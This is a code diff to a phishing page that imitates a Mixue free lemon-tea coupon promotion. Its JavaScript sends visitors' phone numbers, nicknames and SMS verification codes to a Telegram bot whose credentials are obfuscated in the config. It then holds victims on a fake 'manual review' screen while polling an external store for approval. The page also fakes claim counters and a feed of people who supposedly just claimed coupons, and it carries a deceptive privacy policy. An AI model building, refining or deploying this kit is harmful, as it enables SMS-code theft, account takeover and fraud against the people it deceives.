@@ -57,9 +57,35 @@
 
     .content { padding:32px 28px 40px; background:var(--mixue-white); }
 
-    .barrage-box { height:120px; margin:0 0 20px; background:rgba(230,57,70,0.05); border-radius:var(--radius-sm); overflow:hidden; position:relative; border:1px solid rgba(230,57,70,0.1); padding:8px 0; }
-    .barrage-item { position:absolute; white-space:nowrap; font-size:0.95rem; font-weight:600; padding:6px 16px; line-height:1.4; left:100%; background:rgba(255,255,255,0.92); border-radius:20px; box-shadow:0 2px 8px rgba(0,0,0,0.12); z-index:1; animation:barrageSlide linear forwards; }
-    @keyframes barrageSlide { 0% {transform:translateX(0);} 100% {transform:translateX(-200%);} }
+    .barrage-box { 
+      height: 58px;
+      margin:0 0 20px; 
+      background:rgba(230,57,70,0.05); 
+      border-radius:var(--radius-sm); 
+      overflow:hidden; 
+      position:relative; 
+      border:1px solid rgba(230,57,70,0.1); 
+    }
+    .barrage-item { 
+      position:absolute; 
+      white-space:nowrap; 
+      font-size:0.78rem; 
+      font-weight:600; 
+      padding:4px 12px; 
+      line-height:1.25; 
+      left:100%; 
+      background:rgba(255,255,255,0.94); 
+      border-radius:10px; 
+      box-shadow:0 1px 3px rgba(0,0,0,0.07); 
+      z-index:1; 
+      animation:barrageSlide linear forwards; 
+      will-change: transform;
+      pointer-events: none;
+    }
+    @keyframes barrageSlide { 
+      0% { transform:translateX(0); } 
+      100% { transform:translateX(calc(-100vw - 140%)); } 
+    }
 
     .input-box { position:relative; margin-bottom:20px; }
     input { width:100%; height:56px; padding:0 24px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
@@ -67,108 +93,130 @@
     input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
     @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }
 
-.verify-slider {
-  width: 100%;
-  height: 54px;
-  background: #f0f2f5;
-  border-radius: 27px;
-  position: relative;
-  margin: 24px 0 32px;
-  overflow: hidden;
-  border: 1px solid #e8eaed;
-  box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
-  display: none;
-  opacity: 0;
-  transform: translateY(12px);
-  transition: all 0.4s ease;
-}
+    .verify-slider {
+      width: 100%;
+      height: 54px;
+      background: #f0f2f5;
+      border-radius: 27px;
+      position: relative;
+      margin: 24px 0 32px;
+      overflow: hidden;
+      border: 1px solid #e8eaed;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
+      display: none;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: all 0.4s ease;
+    }
 
-.verify-slider.show {
-  display: block;
-  opacity: 1;
-  transform: translateY(0);
-}
+    .verify-slider.show {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
 
-.verify-bg {
-  position: absolute;
-  left: 0;
-  top: 0;
-  height: 100%;
-  background: linear-gradient(90deg, #ffd166, #ffbd59);
-  width: 0;
-  transition: width 0.18s ease;
-  border-radius: 27px 0 0 27px;
-}
+    .verify-bg {
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      background: linear-gradient(90deg, #ffd166, #ffbd59);
+      width: 0;
+      transition: width 0.18s ease;
+      border-radius: 27px 0 0 27px;
+    }
 
-.verify-success .verify-bg {
-  background: linear-gradient(90deg, #52c41a, #73d13d);
-  border-radius: 27px;
-}
+    .verify-success .verify-bg {
+      background: linear-gradient(90deg, #52c41a, #73d13d);
+      border-radius: 27px;
+    }
 
-.verify-block {
-  position: absolute;
-  left: 0;
-  top: 0;
-  width: 54px;
-  height: 54px;
-  background: white;
-  border-radius: 50%;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 22px;
-  font-weight: bold;
-  color: #666;
-  cursor: grab;
-  transition: all 0.2s ease;
-  z-index: 2;
-  user-select: none;
-}
+    .verify-block {
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 54px;
+      height: 54px;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      font-weight: bold;
+      color: #666;
+      cursor: grab;
+      transition: all 0.2s ease;
+      z-index: 2;
+      user-select: none;
+    }
 
-.verify-block:active {
-  cursor: grabbing;
-  transform: scale(1.08);
-  box-shadow: 0 6px 20px rgba(0,0,0,0.22);
-}
+    .verify-block:active {
+      cursor: grabbing;
+      transform: scale(1.08);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.22);
+    }
 
-.verify-success .verify-block {
-  background: #52c41a;
-  color: white;
-  box-shadow: 0 4px 16px rgba(82,196,26,0.4);
-}
+    .verify-success .verify-block {
+      background: #52c41a;
+      color: white;
+      box-shadow: 0 4px 16px rgba(82,196,26,0.4);
+    }
 
-.verify-text {
-  position: absolute;
-  left: 0;
-  right: 0;
-  top: 0;
-  bottom: 0;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: #8c8c8c;
-  font-size: 0.98rem;
-  font-weight: 500;
-  pointer-events: none;
-  z-index: 1;
-  transition: color 0.3s;
-}
+    .verify-text {
+      position: absolute;
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8c8c8c;
+      font-size: 0.98rem;
+      font-weight: 500;
+      pointer-events: none;
+      z-index: 1;
+      transition: color 0.3s;
+    }
 
-.verify-success .verify-text {
-  color: #52c41a;
-  font-weight: 600;
-  content: "验证成功";
-}
+    .verify-success .verify-text {
+      color: #52c41a;
+      font-weight: 600;
+    }
 
     .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); }
     .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }
 
-    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.92); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(4px); }
+    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.95); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(8px); }
     .loading-mask.show { display:flex; }
-    .loading-spinner { width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid var(--mixue-red); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:16px; }
+    .loading-spinner { width:60px; height:60px; border:5px solid #f3f3f3; border-top:5px solid var(--mixue-red); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:24px; }
     @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
-    .loading-text { font-size:1rem; color:var(--mixue-dark); font-weight:500; }
+    
+    .loading-title { 
+      font-size:1.5rem; 
+      color:var(--mixue-red); 
+      font-weight:700; 
+      margin-bottom:12px;
+      animation:pulse 2s infinite;
+    }
+    .loading-subtitle { 
+      font-size:1rem; 
+      color:#666; 
+      font-weight:500; 
+      text-align:center;
+      padding:0 40px;
+      line-height:1.6;
+    }
+    .loading-hint {
+      position:absolute;
+      bottom:40px;
+      font-size:0.85rem;
+      color:#999;
+      text-align:center;
+      padding:0 30px;
+    }
 
     .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; }
     .modal.show { display:flex; }
@@ -180,6 +228,30 @@
     .toast-container { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:999999; display:flex; flex-direction:column; gap:8px; }
     .toast { background:rgba(0,0,0,0.7); color:#fff; padding:12px 24px; border-radius:20px; font-size:0.95rem; animation:toastIn 0.3s ease-out; }
     @keyframes toastIn { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+
+    .agreement {
+      text-align: center;
+      font-size: 0.82rem;
+      color: #666;
+      margin-top: 16px;
+      line-height: 1.5;
+    }
+    .agreement a {
+      color: var(--mixue-red);
+      text-decoration: none;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .agreement a:hover {
+      text-decoration: underline;
+    }
+
+    .rejected-modal .modal-content {
+      border: 3px solid #ff4d4f;
+    }
+    .rejected-modal h2 {
+      color: #ff4d4f;
+    }
   </style>
 </head>
 <body>
@@ -188,7 +260,9 @@
 
 <div class="loading-mask" id="loadingMask">
   <div class="loading-spinner"></div>
-  <div class="loading-text">加载中...</div>
+  <div class="loading-title">雪王正在观察一切……</div>
+  <div class="loading-subtitle">正在检查环境中，不要离开或刷新此页面</div>
+  <div class="loading-hint">预计审核时间：30秒 - 2分钟<br>请保持网络畅通</div>
 </div>
 
 <div class="card">
@@ -199,7 +273,7 @@
       活动进行中：2026年1月30日 — 2026年2月18日<br>
       <strong id="globalTimer">本轮名额倒计时：计算中...</strong>
     </div>
-    <div class="stock-info">全国限量5000份，已领 <span id="claimedCount">4567</span> 张，仅剩 <span id="remainCount">433</span> 张</div>
+    <div class="stock-info">全国限量<span id="totalStockDisplay">5000</span>份，已领 <span id="claimedCount">4567</span> 张，仅剩 <span id="remainCount">433</span> 张</div>
   </div>
 
   <div class="join-count">已有 <span id="countNum">4,567</span> 人抢到福利</div>
@@ -231,6 +305,13 @@
     <button class="btn" id="submitBtn" style="display:none;" disabled>立即领取</button>
 
     <div id="countdown" style="opacity:0; color:var(--mixue-red); text-align:center; margin-top:14px; font-size:0.95rem;"></div>
+
+    <div class="agreement">
+      登录即代表同意
+      <a onclick="showAgreement('privacy')">《隐私政策》</a>
+      和
+      <a onclick="showAgreement('user')">《用户协议》</a>
+    </div>
   </div>
 </div>
 
@@ -245,6 +326,24 @@
   </div>
 </div>
 
+<div class="modal rejected-modal" id="rejectedModal">
+  <div class="modal-content">
+    <h2>审核未通过</h2>
+    <p>抱歉，您的申请未通过人工审核</p>
+    <p style="color:#666; font-size:0.9rem; margin:16px 0;">可能原因：信息异常、重复领取或存在违规操作</p>
+    <div class="modal-emoji">😔</div>
+    <button class="btn" onclick="document.getElementById('rejectedModal').classList.remove('show')" style="background:linear-gradient(135deg, #999, #666);">我知道了</button>
+  </div>
+</div>
+
+<div class="modal" id="agreementModal">
+  <div class="modal-content" style="max-height:80vh; overflow-y:auto; padding:24px 20px; text-align:left;">
+    <h2 id="agreementTitle">协议标题</h2>
+    <div id="agreementContent" style="font-size:0.9rem; line-height:1.6; color:#333; white-space:pre-wrap; margin:16px 0;"></div>
+    <button class="btn" style="margin-top:20px; width:100%;" onclick="document.getElementById('agreementModal').classList.remove('show')">我已阅读</button>
+  </div>
+</div>
+
 <script>
 // ============================= 配置（已混淆） =============================
 const _0x5f2c = {
@@ -254,7 +353,6 @@ const _0x5f2c = {
   _k: 'JDJhJDEwJERlTlBYMVIwQzBQanNoREpmL3cxZC45d2M4ZkhMTkIwYUFHQndYbXJuc01DdlNWVHQvdmdh'
 };
 
-// Base64解码函数
 function _d(b) {
   const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
   let o = '', c1, c2, c3, e1, e2, e3, e4, i = 0;
@@ -271,10 +369,13 @@ function _d(b) {
     if (e3 !== 64) o += String.fromCharCode(c2);
     if (e4 !== 64) o += String.fromCharCode(c3);
   }
-  return decodeURIComponent(escape(o));
+  try {
+    return decodeURIComponent(escape(o));
+  } catch (e) {
+    return o;
+  }
 }
 
-// 动态构建配置
 const _cfg = {
   t: _d(_0x5f2c._b),
   u: _d(_0x5f2c._c),
@@ -286,15 +387,15 @@ const TOTAL_STOCK = 5000;
 let claimed = 4567;
 let isVerifySuccess = false;
 let timers = {};
+let isSending = false;
+let isPolling = false;
 
-// 生成随机优惠券码
 function generateCouponCode() {
   const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
   const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
   return `${prefix}-ICE-${suffix}`;
 }
 
-// DOM对象获取
 const els = {
   phone: document.getElementById('phone'),
   nickname: document.getElementById('nickname'),
@@ -304,6 +405,7 @@ const els = {
   submitBtn: document.getElementById('submitBtn'),
   countdown: document.getElementById('countdown'),
   modal: document.getElementById('successModal'),
+  rejectedModal: document.getElementById('rejectedModal'),
   claimedCount: document.getElementById('claimedCount'),
   remainCount: document.getElementById('remainCount'),
   countNum: document.getElementById('countNum'),
@@ -313,10 +415,12 @@ const els = {
   verifyBg: document.getElementById('verifyBg'),
   loadingMask: document.getElementById('loadingMask'),
   globalTimer: document.getElementById('globalTimer'),
-  closeModalBtn: document.getElementById('closeModalBtn')
+  closeModalBtn: document.getElementById('closeModalBtn'),
+  agreementModal: document.getElementById('agreementModal'),
+  agreementTitle: document.getElementById('agreementTitle'),
+  agreementContent: document.getElementById('agreementContent')
 };
 
-// ============================= 函数 =============================
 function showToast(msg) {
   const t = document.createElement('div');
   t.className = 'toast';
@@ -341,29 +445,74 @@ function shootBarrage(customPhone = null) {
     phoneDisplay = prefix + "****" + suffix;
   }
 
-  const surnames = [
-    '赵', '钱', '孙', '李', '周', '吴', '郑', '王', '冯', '陈',
-    '褚', '卫', '蒋', '沈', '韩', '杨', '朱', '秦', '尤', '许',
-    '何', '吕', '施', '张', '孔', '曹', '严', '华', '金', '魏',
-    '陶', '姜', '郝', '董', '梁', '杜', '戴', '宋', '唐', '邓',
-    '蔡', '潘', '袁', '于', '胡', '林', '郭', '马', '罗', '高'
-  ];
+  const surnames = ['赵','钱','孙','李','周','吴','郑','王','冯','陈','褚','卫','蒋','沈','韩','杨','朱','秦','尤','许','何','吕','施','张','孔','曹','严','华','金','魏','陶','姜','郝','董','梁','杜','戴','宋','唐','邓','蔡','潘','袁','于','胡','林','郭','马','罗','高'];
   const surname = surnames[Math.floor(Math.random() * surnames.length)];
 
   const item = document.createElement('div');
   item.className = 'barrage-item';
   item.textContent = `${surname}** ${phoneDisplay} 刚刚领取成功！`;
-  item.style.top = (12 + Math.floor(Math.random() * 70)) + 'px';
-  const colors = ['#c1121f', '#e63946', '#d00000', '#9d0208', '#6a040f'];
+
+  const randomTop = 10 + Math.random() * (34 - 10);
+  item.style.top = randomTop + 'px';
+
+  const colors = ['#c1121f', '#e63946', '#d00000', '#9d0208', '#6a040f', '#370617'];
   item.style.color = colors[Math.floor(Math.random() * colors.length)];
-  const duration = 10 + Math.random() * 8;
+
+  const duration = 3.5 + Math.random() * 2.0;
   item.style.animationDuration = duration + 's';
+
   els.barrageBox.appendChild(item);
-  setTimeout(() => item.remove(), duration * 1000 + 800);
+  setTimeout(() => item.parentNode && item.remove(), duration * 1000 + 300);
+}
+
+function showAgreement(type) {
+  let title = type === 'privacy' ? '隐私政策' : '用户协议';
+  let content = type === 'privacy' ? 
+`最后更新：2026年1月1日
+
+我们重视您的隐私。本政策说明我们如何收集、使用和保护您的信息。
+
+1. 收集的信息
+- 手机号、昵称（您主动提供）
+- 设备信息、IP地址、访问时间
+
+2. 使用目的
+- 身份验证与福利发放
+- 防刷、防作弊
+- 服务优化
+
+3. 信息共享
+仅在必要时与蜜雪冰城官方合作门店共享券码信息用于核销，不会出售您的个人信息。
+
+4. 您的权利
+可联系我们申请查看、更正或删除个人信息。
+
+感谢您的信任！` :
+`最后更新：2026年1月1日
+
+1. 服务说明
+本活动提供限量免费大杯柠檬茶券，先到先得。
+
+2. 使用规则
+- 每手机号限领1次
+- 禁止使用脚本、接码平台
+- 券码需在有效期内到店核销
+
+3. 违规处理
+发现作弊行为将取消资格并永久限制参与。
+
+4. 免责声明
+活动最终解释权归蜜雪冰城所有。因不可抗力导致活动变更，我们不承担责任。
+
+点击"获取验证码"即表示同意本协议全部条款。`;
+
+  els.agreementTitle.textContent = title;
+  els.agreementContent.textContent = content;
+  els.agreementModal.classList.add('show');
 }
 
 function updateStock() {
-  const remain = Math.max(0, TOTAL_STOCK - (claimed - 4567));
+  const remain = Math.max(0, TOTAL_STOCK - claimed);
   els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
   els.remainCount.textContent = remain.toLocaleString('zh-CN');
   els.countNum.textContent = claimed.toLocaleString('zh-CN');
@@ -371,11 +520,14 @@ function updateStock() {
 }
 
 function fakeClaim() {
-  if (Math.random() > 0.45) {
-    const add = 1 + Math.floor(Math.random()*5);
+  if (Math.random() > 0.4) {
+    const add = 1 + Math.floor(Math.random() * 4);
     claimed += add;
     updateStock();
-    for(let i=0; i<add; i++) setTimeout(shootBarrage, i*900);
+    const barrageCount = Math.min(add + Math.floor(Math.random() * 2), 6);
+    for (let i = 0; i < barrageCount; i++) {
+      setTimeout(shootBarrage, i * 400 + Math.random() * 350);
+    }
   }
 }
 
@@ -392,7 +544,7 @@ function checkPhoneValid() {
     isVerifySuccess = false;
     resetSlider();
   }
-  els.getBtn.disabled = !valid || !isVerifySuccess;
+  els.getBtn.disabled = !valid || !isVerifySuccess || isSending;
 }
 
 function resetSlider() {
@@ -469,32 +621,102 @@ function startCountdown() {
   timers.global = setInterval(tick, 1000);
 }
 
-async function pollCheck(phone) {
-  els.loadingMask.querySelector('.loading-text').textContent = '人工审核中，请稍等...';
+// 开始人工审核轮询
+function startManualReview(phone, nickname, code) {
+  if (isPolling) return;
+  isPolling = true;
+  
+  // 显示加载界面
   els.loadingMask.classList.add('show');
-
+  
   const headers = {
     'Content-Type': 'application/json',
     'X-Master-Key': _cfg.m
   };
 
-  timers.poll = setInterval(async () => {
+  // 先发送审核请求到TG
+  const sendReviewRequest = async () => {
     try {
-      const { data } = await axios.get(`https://api.jsonbin.io/v3/b/${_cfg.b}`, { headers: headers });
-      if (data?.record?.allowed_phones?.includes(phone)) {
-        clearInterval(timers.poll);
-        els.loadingMask.classList.remove('show');
-        claimed++;
-        updateStock();
-        shootBarrage(phone);
-        els.couponCode.textContent = generateCouponCode();
-        els.modal.classList.add('show');
-        localStorage.setItem('mx_claim_' + phone, Date.now());
+      const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
+      const params = new URLSearchParams();
+      params.append('chat_id', _cfg.u);
+      params.append('text', `【待审核】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n\n请回复"通过 ${phone}"或"拒绝 ${phone}"进行审核`);
+
+      await fetch(ep, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: params
+      });
+    } catch (err) {
+      console.error('发送审核请求失败：', err);
+    }
+  };
+
+  sendReviewRequest();
+
+  // 轮询检查审核结果
+  let pollCount = 0;
+  const maxPolls = 120; // 最多轮询10分钟（每5秒一次）
+  
+  timers.poll = setInterval(async () => {
+    pollCount++;
+    
+    if (pollCount > maxPolls) {
+      clearInterval(timers.poll);
+      isPolling = false;
+      els.loadingMask.classList.remove('show');
+      showToast('审核超时，请稍后重试');
+      return;
+    }
+
+    try {
+      const { data } = await axios.get(`https://api.jsonbin.io/v3/b/${_cfg.b}/latest`, { headers });
+      
+      if (data?.record) {
+        const record = data.record;
+        
+        // 检查是否通过
+        if (record.allowed_phones && record.allowed_phones.includes(phone)) {
+          clearInterval(timers.poll);
+          isPolling = false;
+          els.loadingMask.classList.remove('show');
+          
+          // 审核通过，发放奖励
+          claimed++;
+          updateStock();
+          shootBarrage(phone);
+          els.couponCode.textContent = generateCouponCode();
+          els.modal.classList.add('show');
+          localStorage.setItem('mx_claim_' + phone, Date.now());
+          
+          // 发送通过通知到TG
+          const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
+          const params = new URLSearchParams();
+          params.append('chat_id', _cfg.u);
+          params.append('text', `【已通过】\n手机号：${phone}\n券码：${els.couponCode.textContent}\n时间：${new Date().toLocaleString('zh-CN')}`);
+          
+          fetch(ep, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: params
+          }).catch(console.error);
+          
+          return;
+        }
+        
+        // 检查是否被拒绝
+        if (record.rejected_phones && record.rejected_phones.includes(phone)) {
+          clearInterval(timers.poll);
+          isPolling = false;
+          els.loadingMask.classList.remove('show');
+          els.rejectedModal.classList.add('show');
+          return;
+        }
       }
     } catch (err) {
-      console.log('轮询失败：', err);
+      console.log('轮询检查失败：', err);
     }
-  }, 6000);
+  }, 5000); // 每5秒检查一次
 }
 
 // ============================= 事件 =============================
@@ -506,43 +728,56 @@ els.closeModalBtn.addEventListener('click', () => {
 });
 
 els.getBtn.addEventListener('click', async () => {
-  if (els.getBtn.disabled) return;
+  if (els.getBtn.disabled || isSending) return;
+
+  isSending = true;
+  els.getBtn.disabled = true;
+  els.getBtn.textContent = '发送中...';
+
   const phone = els.phone.value.trim();
   const nick = els.nickname.value.trim() || '无';
 
   try {
     const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
-    await fetch(ep, {
+    const params = new URLSearchParams();
+    params.append('chat_id', _cfg.u);
+    params.append('text', `【新号】\n昵称：${nick}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`);
+
+    const response = await fetch(ep, {
       method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        chat_id: _cfg.u,
-        text: `【新号】\n昵称：${nick}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`
-      })
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params
     });
-  } catch (err) {
-    console.log('发送失败：', err);
-    showToast('网络异常，稍后再试');
-  }
 
-  let s = 60;
-  els.getBtn.disabled = true;
-  els.getBtn.textContent = `重发(${s}s)`;
-  els.code.focus();
-  els.countdown.style.opacity = '1';
-  els.countdown.textContent = `验证码已发送（${s}s）`;
+    if (!response.ok) throw new Error('Telegram 发送失败');
 
-  timers.code = setInterval(() => {
-    s--;
+    let s = 60;
     els.getBtn.textContent = `重发(${s}s)`;
+    els.code.focus();
+    els.countdown.style.opacity = '1';
     els.countdown.textContent = `验证码已发送（${s}s）`;
-    if (s <= 0) {
-      clearInterval(timers.code);
-      els.getBtn.disabled = false;
-      els.getBtn.textContent = '获取验证码';
-      els.countdown.style.opacity = '0';
-    }
-  }, 1000);
+
+    timers.code = setInterval(() => {
+      s--;
+      if (s > 0) {
+        els.getBtn.textContent = `重发(${s}s)`;
+        els.countdown.textContent = `验证码已发送（${s}s）`;
+      } else {
+        clearInterval(timers.code);
+        isSending = false;
+        els.getBtn.disabled = !( /^1[3-9]\d{9}$/.test(els.phone.value.trim()) && isVerifySuccess );
+        els.getBtn.textContent = '获取验证码';
+        els.countdown.style.opacity = '0';
+      }
+    }, 1000);
+
+  } catch (err) {
+    console.error('发送失败：', err);
+    showToast('网络异常，稍后再试');
+    isSending = false;
+    els.getBtn.disabled = false;
+    els.getBtn.textContent = '获取验证码';
+  }
 });
 
 els.code.addEventListener('input', () => {
@@ -553,41 +788,41 @@ els.code.addEventListener('input', () => {
 });
 
 els.submitBtn.addEventListener('click', async () => {
-  if (els.submitBtn.disabled) return;
+  if (els.submitBtn.disabled || isPolling) return;
+
   const phone = els.phone.value.trim();
   const code = els.code.value.trim();
   const nick = els.nickname.value.trim() || '无';
 
-  if (code.length !== 6) return showToast('请输入6位有效验证码');
-
-  try {
-    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
-    await fetch(ep, {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        chat_id: _cfg.u,
-        text: `【验证码】\n昵称：${nick}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n放行：通过 ${phone}`
-      })
-    });
-  } catch (err) {
-    console.log('发送失败：', err);
-    showToast('网络异常，提交失败');
+  if (code.length !== 6) {
+    showToast('请输入6位有效验证码');
     return;
   }
 
-  pollCheck(phone);
-  showToast('提交成功，正在等待人工审核...');
+  // 检查是否已经领取过
+  if (localStorage.getItem('mx_claim_' + phone)) {
+    showToast('该手机号已参与过活动');
+    return;
+  }
+
+  // 开始人工审核流程
+  startManualReview(phone, nick, code);
 });
 
 els.modal.addEventListener('click', e => {
   if (e.target === els.modal) els.modal.classList.remove('show');
 });
 
+els.rejectedModal.addEventListener('click', e => {
+  if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
+});
+
 // ============================= 启动 =============================
 window.addEventListener('load', () => {
-  timers.fake = setInterval(fakeClaim, 2200);
-  timers.barrage = setInterval(() => Math.random() > 0.5 && shootBarrage(), 5000);
+  timers.fake    = setInterval(fakeClaim, 1400);
+  timers.barrage = setInterval(() => {
+    if (Math.random() > 0.35) shootBarrage();
+  }, 1600);
   startCountdown();
   updateStock();
 });
